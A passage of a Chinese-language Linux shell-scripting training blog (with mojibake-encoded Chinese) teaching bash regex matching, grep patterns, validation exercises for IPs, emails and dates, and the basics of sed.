bash re.sh 1a1b1</span><br><span class="line">ok</span><br></pre></td></tr></table></figure><h4 id="ä»£è¡¨åŒ¹é…æŒ‡å®šå­—ç¬¦ç»„å†…çš„ä»»ä¸€å­—ç¬¦ï¼Œå¯ä»¥ç”¨é€—å·åˆ†å‰²ï¼Œæˆ–è€…ä¸ç”¨ï¼Œæ•ˆæœä¸€æ ·éƒ½ä»£è¡¨åŒ¹é…ä¸€ä¸ªå­—ç¬¦"><a href="#ä»£è¡¨åŒ¹é…æŒ‡å®šå­—ç¬¦ç»„å†…çš„ä»»ä¸€å­—ç¬¦ï¼Œå¯ä»¥ç”¨é€—å·åˆ†å‰²ï¼Œæˆ–è€…ä¸ç”¨ï¼Œæ•ˆæœä¸€æ ·éƒ½ä»£è¡¨åŒ¹é…ä¸€ä¸ªå­—ç¬¦" class="headerlink" title="ä»£è¡¨åŒ¹é…æŒ‡å®šå­—ç¬¦ç»„å†…çš„ä»»ä¸€å­—ç¬¦ï¼Œå¯ä»¥ç”¨é€—å·åˆ†å‰²ï¼Œæˆ–è€…ä¸ç”¨ï¼Œæ•ˆæœä¸€æ ·éƒ½ä»£è¡¨åŒ¹é…ä¸€ä¸ªå­—ç¬¦"></a>ä»£è¡¨åŒ¹é…æŒ‡å®šå­—ç¬¦ç»„å†…çš„ä»»ä¸€å­—ç¬¦ï¼Œå¯ä»¥ç”¨é€—å·åˆ†å‰²ï¼Œæˆ–è€…ä¸ç”¨ï¼Œæ•ˆæœä¸€æ ·éƒ½ä»£è¡¨åŒ¹é…ä¸€ä¸ªå­—ç¬¦</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ [Bb]ooboo ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh booboo</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh Booboo</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh cooboo</span><br><span class="line">no</span><br></pre></td></tr></table></figure><h4 id="ä»£è¡¨åŒ¹é…ä¸åœ¨æŒ‡å®šå­—ç¬¦ç»„å†…çš„ä»»ä¸€å­—ç¬¦"><a href="#ä»£è¡¨åŒ¹é…ä¸åœ¨æŒ‡å®šå­—ç¬¦ç»„å†…çš„ä»»ä¸€å­—ç¬¦" class="headerlink" title="ä»£è¡¨åŒ¹é…ä¸åœ¨æŒ‡å®šå­—ç¬¦ç»„å†…çš„ä»»ä¸€å­—ç¬¦"></a>ä»£è¡¨åŒ¹é…ä¸åœ¨æŒ‡å®šå­—ç¬¦ç»„å†…çš„ä»»ä¸€å­—ç¬¦</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ [^Bb]ooboo ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh booboo</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh Booboo</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh cooboo</span><br><span class="line">ok</span><br></pre></td></tr></table></figure><h4 id="å•è¯èµ·å§‹å’Œç»“æŸè¾¹ç•ŒåŒ¹é…ç¬¦ä¸è¡Œé¦–è¡Œå°¾çš„åŒ¹é…å¯¹æ¯”"><a href="#å•è¯èµ·å§‹å’Œç»“æŸè¾¹ç•ŒåŒ¹é…ç¬¦ä¸è¡Œé¦–è¡Œå°¾çš„åŒ¹é…å¯¹æ¯”" class="headerlink" title="å•è¯èµ·å§‹å’Œç»“æŸè¾¹ç•ŒåŒ¹é…ç¬¦ä¸è¡Œé¦–è¡Œå°¾çš„åŒ¹é…å¯¹æ¯”"></a>å•è¯èµ·å§‹å’Œç»“æŸè¾¹ç•ŒåŒ¹é…ç¬¦ä¸è¡Œé¦–è¡Œå°¾çš„åŒ¹é…å¯¹æ¯”</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.file</span><br><span class="line">boobootomjack</span><br><span class="line">jacktombooboo</span><br><span class="line">tom tomtom</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# grep "^booboo" re.file</span><br><span class="line">boobootomjack</span><br><span class="line">[root@rhel6 ~]# grep "\&lt;booboo" re.file</span><br><span class="line">boobootomjack</span><br><span class="line">jacktombooboo</span><br><span class="line">[root@rhel6 ~]# grep "\&gt;booboo" re.file</span><br><span class="line">[root@rhel6 ~]# grep "\&gt;jack" re.file</span><br><span class="line">[root@rhel6 ~]# grep "jack$" re.file</span><br><span class="line">boobootomjack</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br><span class="line">[root@rhel6 ~]# grep "jack\&gt;" re.file</span><br><span class="line">boobootomjack</span><br><span class="line">jacktombooboo</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br></pre></td></tr></table></figure><h4 id="æŸä¸ªå­—ç¬¦æ•°é‡é™å®š"><a href="#æŸä¸ªå­—ç¬¦æ•°é‡é™å®š" class="headerlink" title="æŸä¸ªå­—ç¬¦æ•°é‡é™å®š"></a>æŸä¸ªå­—ç¬¦æ•°é‡é™å®š</h4><ul><li>x{m}è¿ç»­ M ä¸ªå­—ç¬¦ X       x{3} =3<ul><li>x{m,} è‡³å°‘ M ä¸ªå­—ç¬¦ Xx{3,} &gt;=3</li></ul></li><li>x{m,n} è‡³å°‘ M ä¸ªæœ€å¤š N ä¸ªå­—ç¬¦ X x{3,4} &gt;=3 &lt;=4</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.file</span><br><span class="line">boobootomjack</span><br><span class="line">jacktombooboo</span><br><span class="line">tom tomtom</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br><span class="line">ffofoofooofoooo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# grep "o\&#123;0\&#125;" re.file</span><br><span class="line">boobootomjack</span><br><span class="line">jacktombooboo</span><br><span class="line">tom tomtom</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br><span class="line">booo</span><br><span class="line">boo</span><br><span class="line">ffofoofooofoooo</span><br><span class="line">[root@rhel6 ~]# grep "o\&#123;1\&#125;" re.file</span><br><span class="line">boobootomjack</span><br><span class="line">jacktombooboo</span><br><span class="line">tom tomtom</span><br><span class="line">booo</span><br><span class="line">boo</span><br><span class="line">ffofoofooofoooo</span><br><span class="line">[root@rhel6 ~]# grep "o\&#123;4\&#125;" re.file</span><br><span class="line">ffofoofooofoooo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ o&#123;2,3&#125;$ ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# bash re.sh foo</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh fooo</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh fooof</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh foof</span><br><span class="line">no</span><br></pre></td></tr></table></figure><h4 id="digit-ä»£è¡¨æ•°å­—è€Œå·²-0-9"><a href="#digit-ä»£è¡¨æ•°å­—è€Œå·²-0-9" class="headerlink" title="[:digit:]ä»£è¡¨æ•°å­—è€Œå·² , 0-9"></a>[:digit:]ä»£è¡¨æ•°å­—è€Œå·² , 0-9</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# cat re.file1</span><br><span class="line">45aa</span><br><span class="line">sdfsdf</span><br><span class="line">4444</span><br><span class="line">[root@rhel6 ~]# grep "[[:digit:]]" re.file1</span><br><span class="line">45aa</span><br><span class="line">4444</span><br><span class="line">[root@rhel6 ~]# grep "^[[:digit:]]" re.file1</span><br><span class="line">45aa</span><br><span class="line">4444</span><br><span class="line">[root@rhel6 ~]# grep "[^[:digit:]]" re.file1</span><br><span class="line">45aa</span><br><span class="line">sdfsdf</span><br><span class="line">[root@rhel6 ~]# grep "^[^[:digit:]]" re.file1</span><br><span class="line">sdfsdf</span><br></pre></td></tr></table></figure><h3 id="è¯¾å ‚ä½œä¸š"><a href="#è¯¾å ‚ä½œä¸š" class="headerlink" title="è¯¾å ‚ä½œä¸š"></a>è¯¾å ‚ä½œä¸š</h3><blockquote><p>1.è¯´å‡ºä¸‹é¢åŒ¹é…çš„å†…å®¹</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">^a ä»¥aå¼€å¤´</span></span><br><span class="line"><span class="meta">#</span><span class="bash">b? bçš„ä¸ªæ•°0æˆ–è€…1</span></span><br><span class="line"><span class="meta">#</span><span class="bash">c+ cçš„ä¸ªæ•°&gt;=1</span></span><br><span class="line"><span class="meta">#</span><span class="bash">d.*e då’Œeä¹‹é—´å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦</span></span><br><span class="line"><span class="meta">#</span><span class="bash">f$ ä»¥fç»“å°¾</span></span><br><span class="line">if [[ $1 =~ ^ab?c+d.*ef$ ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h3 id="è¯¾åä½œä¸š"><a href="#è¯¾åä½œä¸š" class="headerlink" title="è¯¾åä½œä¸š"></a>è¯¾åä½œä¸š</h3><blockquote><p>1.ifåˆ¤æ–­åŒ¹é…ipåœ°å€</p></blockquote><blockquote><p>2.ifåˆ¤æ–­åŒ¹é…é‚®ä»¶åœ°å€æ ¼å¼ä¸º<a href="mailto:9aA@9aA.com">9aA@9aA.com</a></p></blockquote><blockquote><p>3.grep è¿‡æ»¤ç©ºç™½è¡Œ</p></blockquote><blockquote><p>4.grep è¿‡æ»¤ä»¥ç©ºæ ¼å¼€å¤´çš„è¡Œ</p></blockquote><blockquote><p>5.é’ˆå¯¹/usr/share/dict/wordsæ–‡ä»¶åšè¿‡æ»¤</p></blockquote><blockquote><p> 1ï¼‰åˆ—å‡ºæ–‡ä»¶ä¸­åŒ…å« å…ˆæœ‰å­—æ¯tï¼Œç„¶åä¸­é—´æœ‰ä¸€ä¸ªå…ƒéŸ³å­—æ¯ï¼Œä¹‹åæ˜¯shçš„å•è¯ï¼›</p></blockquote><blockquote><p> 2ï¼‰åˆ—å‡ºæ–‡ä»¶ä¸­åŒ…å« å…ˆæœ‰å­—æ¯tï¼Œç„¶åä¸­é—´æœ‰è‹¥å¹²ä¸ªå…ƒéŸ³å­—æ¯ï¼Œä¹‹åæ˜¯shçš„å•è¯ï¼›</p></blockquote><blockquote><p> 3ï¼‰åˆ—å‡ºæ–‡ä»¶ä¸­åˆšå¥½åŒ…å«16ä¸ªå­—æ¯çš„å•è¯ã€‚**</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ^[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;$ ]]</span><br><span class="line">then</span><br><span class="line">IP=($&#123;1//\./ &#125;)</span><br><span class="line">[ $&#123;IP[0]&#125; -gt 0 -a $&#123;IP[0]&#125; -lt 255 ] &amp;&amp; [ $&#123;IP[1]&#125; -ge 0 -a $&#123;IP[1]&#125; -lt 255 ] &amp;&amp; [ $&#123;IP[2]&#125; -ge 0 -a $&#123;IP[2]&#125; -lt 255 ] &amp;&amp; [ $&#123;IP[3]&#125; -gt 0 -a $&#123;IP[3]&#125; -lt 255 ] &amp;&amp; echo ok || echo no</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">        echo "this is not IPADDR!"</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ^[0-9a-zA-Z]+@[0-9a-zA-Z]+\.com$  ]]</span><br><span class="line">then</span><br><span class="line">echo ok</span><br><span class="line">else</span><br><span class="line">echo no</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# grep "^$" re.file2</span><br><span class="line"></span><br><span class="line">grep '^t[a-zA-Z]sh' /usr/share/dict/words</span><br><span class="line">grep '^t[a-zA-Z]\+sh' /usr/share/dict/words</span><br><span class="line">grep -E '^[a-zA-Z0-9]&#123;16&#125;$' /usr/share/dict/words                         </span><br><span class="line">grep '^[a-zA-Z0-9]\&#123;16\&#125;$' /usr/share/dict/words</span><br></pre></td></tr></table></figure><h3 id="æ™šè‡ªä¹ ä½œä¸š"><a href="#æ™šè‡ªä¹ ä½œä¸š" class="headerlink" title="æ™šè‡ªä¹ ä½œä¸š"></a>æ™šè‡ªä¹ ä½œä¸š</h3><ol><li>å®Œæˆæ‰€æœ‰ç»ƒä¹ </li><li>å¸å·æ˜¯å¦åˆæ³•ï¼ˆå­—æ¯å¼€å¤´ï¼Œå…è®¸5-16ä½ï¼Œåªèƒ½åŒ…å«å­—æ¯æ•°å­—ä¸‹åˆ’çº¿ï¼‰</li><li>å¯†ç æ˜¯å¦åˆæ³•ï¼ˆå­—æ¯å¼€å¤´ï¼Œå…è®¸6-18ä½ï¼Œåªèƒ½åŒ…å«å­—æ¯æ•°å­—ä¸‹åˆ’çº¿å’Œï¼@#ï¼‰</li><li>åŒ¹é…æ—¥æœŸ2016-10-11<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">if</span> [[ <span class="variable">$1</span> =~ ^[0-9]&#123;4&#125;-[0-9]&#123;2&#125;-[0-9]&#123;2&#125;$ ]]</span></span><br><span class="line">if [[ $1 =~ ^[0-9]&#123;4&#125;-(0[1-9]|1[0-2])-(0[1-9]|1[0-9]|2[1-9]|3[01])$ ]]</span><br><span class="line">then</span><br><span class="line">echo ok</span><br><span class="line">else</span><br><span class="line">echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Regular Expression ã€ regex æˆ– regexp, ç¼©å†™ä¸º RE æ­£åˆ™è¡¨è¾¾å¼è¿™ä¸ªæ¦‚å¿µæœ€åˆæ˜¯ç”± Unix ä¸­çš„å·¥å…·è½¯ä»¶ ( ä¾‹å¦‚ sed å’Œ grep) æ™®åŠå¼€çš„ã€‚&lt;/p&gt;
&lt;p&gt;é€šå¸¸è¢«ç”¨æ¥æ£€ç´¢ã€æ›¿æ¢é‚£äº›ç¬¦åˆæŸä¸ªè§„åˆ™çš„æ–‡æœ¬ã€‚&lt;/p&gt;
&lt;p&gt;è®¸å¤šç¨‹åºè®¾è®¡è¯­
      
    
    </summary>
    
    
      <category term="æŠ€æœ¯åŸ¹è®­" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShellè„šæœ¬æ•™ç¨‹" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/LinuxShell%E8%84%9A%E6%9C%AC%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="åŸ¹è®­" scheme="http://www.toberoot.com/tags/%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShellè„šæœ¬" scheme="http://www.toberoot.com/tags/LinuxShell%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>LINUX Shell Scripts ç¬¬å››è¯¾ Sed</title>
    <link href="http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/03_shell_sed_awk/"/>
    <id>http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/03_shell_sed_awk/</id>
    <published>2016-12-22T21:06:27.000Z</published>
    <updated>2020-03-24T05:17:54.745Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h2><h3 id="ä»€ä¹ˆæ˜¯sed"><a href="#ä»€ä¹ˆæ˜¯sed" class="headerlink" title="ä»€ä¹ˆæ˜¯sed"></a>ä»€ä¹ˆæ˜¯sed</h3><p>sed( æ„ä¸ºæµç¼–è¾‘å™¨ , æºè‡ªè‹±è¯­ â€œ stream editorâ€ çš„ç¼©å†™ ) æ˜¯ Unix å¸¸è§çš„å‘½ä»¤è¡Œç¨‹åºã€‚ sed ç”¨æ¥æŠŠæ–‡æ¡£æˆ–å­—ç¬¦ä¸²é‡Œé¢çš„æ–‡å­—ç»è¿‡ä¸€ç³»åˆ—ç¼–è¾‘å‘½ä»¤è½¬æ¢ä¸ºå¦ä¸€ç§æ ¼å¼è¾“å‡ºã€‚ sed é€šå¸¸ ç”¨æ¥åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æ–‡æœ¬è¿›è¡Œå¤„ç†ã€‚ åˆ†å· (;) å¯ä»¥ç”¨ä½œåˆ†éš”å‘½ä»¤çš„æŒ‡ç¤ºç¬¦ã€‚å°½ç®¡ sed è„šæœ¬å›ºæœ‰çš„å¾ˆå¤šé™åˆ¶ , ä¸€è¿ä¸²çš„ sed æŒ‡ä»¤åŠ èµ·æ¥å¯ä»¥ç¼–ç¨‹åƒ ä»“ åº“ç•ªã€å¿«æ‰“ç –å—ã€ç”šè‡³ä¿„ç½—æ–¯æ–¹å—ç­‰ç”µè„‘æ¸¸æˆçš„å¤æ‚ç¨‹åºã€‚</p><h3 id="å¦‚ä½•ä½¿ç”¨sed"><a href="#å¦‚ä½•ä½¿ç”¨sed" class="headerlink" title="å¦‚ä½•ä½¿ç”¨sed"></a>å¦‚ä½•ä½¿ç”¨sed</h3><h4 id="è¯­æ³•æ¨¡å¼"><a href="#è¯­æ³•æ¨¡å¼" class="headerlink" title="è¯­æ³•æ¨¡å¼"></a>è¯­æ³•æ¨¡å¼</h4><p>â€¢ å‘½ä»¤è¡Œæ¨¡å¼<br>â€¢ è„šæœ¬æ¨¡å¼</p><p>å‘½ä»¤è¡Œæ¨¡å¼</p><p>sed æµç¼–è¾‘å™¨ é’ˆå¯¹è¡Œè¿›è¡Œæ“ä½œçš„</p><h4 id="sedå‘½ä»¤çš„åŸç†"><a href="#sedå‘½ä»¤çš„åŸç†" class="headerlink" title="sedå‘½ä»¤çš„åŸç†"></a>sedå‘½ä»¤çš„åŸç†</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¯»æ–‡ä»¶---ä¸€è¡Œä¸€è¡Œè¯»</span><br><span class="line">å­˜å…¥ç¼“å­˜ç©ºé—´</span><br><span class="line">åŒ¹é…è¡Œ---æ˜¯---åŠ¨ä½œ--ç»§ç»­è¯»å–</span><br><span class="line">     ---ä¸æ˜¯------ ç»§ç»­è¯»å–    </span><br><span class="line">è¯»åˆ°æœ€åä¸€è¡Œä¸ºæ­¢</span><br><span class="line">è¾“å‡º</span><br></pre></td></tr></table></figure><h4 id="sedå‘½ä»¤çš„ç”¨æ³•"><a href="#sedå‘½ä»¤çš„ç”¨æ³•" class="headerlink" title="sedå‘½ä»¤çš„ç”¨æ³•"></a>sedå‘½ä»¤çš„ç”¨æ³•</h4><ul><li>sed [-options] â€˜[cmd]â€™ filename</li><li>sed [-options] â€˜[å“ªäº›è¡Œ][å¹²ä»€ä¹ˆ]â€™ filename</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">cmd</span><br><span class="line">    æ“ä½œå®šä½ï¼ˆå“ªä¸€è¡Œï¼‰</span><br><span class="line">        1    ç¬¬ä¸€è¡Œ</span><br><span class="line">        2,3    ä»ç¬¬äºŒè¡Œåˆ°ç¬¬ä¸‰è¡Œ</span><br><span class="line">        $    æœ€åä¸€è¡Œ</span><br><span class="line">        æ­£åˆ™è¡¨è¾¾å¼</span><br><span class="line">        /^root/    ä»¥rootå¼€å¤´çš„è¡Œ</span><br><span class="line">        /bin$/    ä»¥binç»“å°¾çš„è¡Œ</span><br><span class="line"></span><br><span class="line">        1. åè¿›åˆ¶æ•°å­—</span><br><span class="line">        2. æ­£åˆ™è¡¨è¾¾å¼</span><br><span class="line">        3. é€—å·åˆ†éš”ç¬¦</span><br><span class="line">        4. ç»„åˆæ–¹å¼</span><br><span class="line">        5. ç‰¹æ®Šæ–¹å¼</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    å‡½æ•°ï¼ˆå¹²ä»€ä¹ˆï¼‰</span><br><span class="line">        p    æ‰“å°ï¼Œè¾“å‡ºåˆ°å±å¹•ä¸Š</span><br><span class="line">        d    åˆ é™¤</span><br><span class="line">        s    æ›¿æ¢                   sed '/^#/s/\/\*.*\*\///' file  </span><br><span class="line">        a    å½“å‰è¡Œçš„è¡Œåï¼Œæ·»åŠ ä¸€è¡Œ    sed '1ahello word' file</span><br><span class="line">        i    å½“å‰è¡Œçš„è¡Œå‰ï¼Œæ·»åŠ ä¸€è¡Œ    sed '1ihello word' file</span><br><span class="line">å‚æ•°options</span><br><span class="line">    -n ä¸è¾“å‡ºæ‰€æœ‰çš„è¡Œ</span><br><span class="line">    -i ç›´æ¥ä¿®æ”¹ç›®æ ‡æ–‡ä»¶</span><br><span class="line">    -e è¿æ¥å¤šä¸ªcmd</span><br><span class="line"></span><br><span class="line">ç®€å•æ§åˆ¶æµ</span><br><span class="line"></span><br><span class="line">1. ! å‘½ä»¤å–å</span><br><span class="line">    ä¾‹å¦‚:sed '/kevin/!d' file</span><br><span class="line">    åˆ é™¤ä¸åŒ…å«å­—ç¬¦ä¸²â€kevinâ€œçš„è¡Œ</span><br><span class="line">2. &#123; &#125; ç»„åˆå¤šä¸ªå‘½ä»¤</span><br><span class="line">ç»„åˆå‘½ä»¤ä½œä¸ºä¸€ä¸ªæ•´ä½“è¢«æ‰§è¡Œ,å‡½æ•°å‘½ä»¤ä¹‹é—´ç”¨â€ ;  â€œåˆ†éš”,ç»„åˆå‘½ä»¤å¯ä»¥åµŒå¥—ã€‚</span><br><span class="line">ä¾‹å¦‚:sed '/kevin/&#123;s/1/2/; /3/d&#125;' fileã€‚</span><br><span class="line"></span><br><span class="line">3. n è¯»å–ä¸‹ä¸€è¾“å…¥è¡Œ,ä»ä¸‹ä¸€æ¡å‘½ä»¤è€Œéç¬¬ä¸€æ¡å‘½ä»¤å¼€å§‹æ“ä½œ</span><br><span class="line">ä¾‹å¦‚:sed '/kevin/&#123;n; d&#125;' file</span><br><span class="line">åˆ é™¤å¸¦å­—ç¬¦ä¸²â€kevinâ€œè¡Œçš„ä¸‹ä¸€è¡Œ</span><br></pre></td></tr></table></figure><h4 id="è¯¾å ‚ç»ƒä¹ "><a href="#è¯¾å ‚ç»ƒä¹ " class="headerlink" title="è¯¾å ‚ç»ƒä¹ "></a>è¯¾å ‚ç»ƒä¹ </h4><ol><li>ä¸‹è½½mysqlbinlog.rowæ–‡ä»¶</li><li>æ‰“å°ç¬¬ä¸‰è¡Œ</li><li>æ‰“å°1åˆ°5è¡Œ</li><li>æ‰“å°æœ€åä¸€è¡Œ</li><li>æ‰“å°30åˆ°æœ€åä¸€è¡Œ</li><li>æ‰“å°åŒ…å«â€œBEGINâ€çš„è¡Œ</li><li>æ‰“å°åŒ…å«â€œCOMMITâ€çš„è¡Œ</li><li>æ‰“å°ä»¥â€œ###â€å¼€å¤´çš„è¡Œ</li><li>åˆ é™¤æ¯ä¸€è¡Œçš„â€œ### â€</li><li>åˆ é™¤æ‰€æœ‰â€œ/<em>åˆ°</em>/â€</li><li>å°†â€œDELETE FROMâ€æ›¿æ¢ä¸ºâ€œinsert intoâ€</li><li>å°†â€œINSERT INTOâ€æ›¿æ¢ä¸ºâ€œdelete 